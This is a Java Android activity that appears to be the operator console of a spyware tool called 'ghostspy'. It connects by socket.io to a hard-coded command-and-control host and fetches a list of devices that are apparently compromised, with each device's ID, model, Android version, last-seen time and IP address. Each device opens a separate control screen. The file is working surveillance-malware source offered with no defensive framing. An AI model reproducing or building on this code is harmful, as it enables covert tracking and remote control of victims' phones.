package com.testapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private Socket socket;
    private TextView statusText;
    private LinearLayout deviceContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        deviceContainer = findViewById(R.id.deviceContainer);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
        } catch (URISyntaxException e) {
            statusText.setText("❌ URL Error");
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            runOnUiThread(() -> {
                statusText.setText("🟢 ONLINE");
                socket.emit("get_devices");
            });
        });

        socket.on("devices_list", args -> {
            try {
                JSONArray devices = (JSONArray) args[0];
                List<String[]> list = new ArrayList<>();
                for (int i = 0; i < devices.length(); i++) {
                    JSONObject d = devices.getJSONObject(i);
                    list.add(new String[]{
                        d.getString("id"),
                        d.getString("model"),
                        d.optString("android", "?"),
                        d.optString("last_seen", ""),
                        d.optString("ip", "")
                    });
                }
                runOnUiThread(() -> {
                    deviceContainer.removeAllViews();
                    for (String[] data : list) {
                        // Card neon
                        LinearLayout card = new LinearLayout(MainActivity.this);
                        card.setOrientation(LinearLayout.VERTICAL);
                        card.setBackground(getDrawable(R.drawable.neon_border));
                        card.setPadding(24, 24, 24, 24);
                        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                                LinearLayout.LayoutParams.MATCH_PARENT,
                                LinearLayout.LayoutParams.WRAP_CONTENT);
                        lp.setMargins(0, 0, 0, 12);
                        card.setLayoutParams(lp);

                        TextView idView = new TextView(MainActivity.this);
                        idView.setText("🆔 " + data[0]);
                        idView.setTextColor(0xFFFF1E5A);
                        idView.setTextSize(16);
                        idView.setTypeface(null, android.graphics.Typeface.BOLD);

                        TextView modelView = new TextView(MainActivity.this);
                        modelView.setText("📱 " + data[1] + " | " + data[2]);
                        modelView.setTextColor(0xFFFFFFFF);
                        modelView.setTextSize(14);

                        TextView ipView = new TextView(MainActivity.this);
                        ipView.setText("IP: " + data[4]);
                        ipView.setTextColor(0xFF9AA3B2);
                        ipView.setTextSize(12);

                        card.addView(idView);
                        card.addView(modelView);
                        card.addView(ipView);

                        card.setOnClickListener(v -> {
                            Intent i = new Intent(MainActivity.this, ControlActivity.class);
                            i.putExtra("deviceId", data[0]);
                            i.putExtra("deviceIp", data[4]);
                            startActivity(i);
                        });

                        deviceContainer.addView(card);
                    }
                    statusText.setText("🟢 ONLINE | " + list.size());
                });
            } catch (Exception e) {
                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
            }
        });

        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
        });

        socket.connect();
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
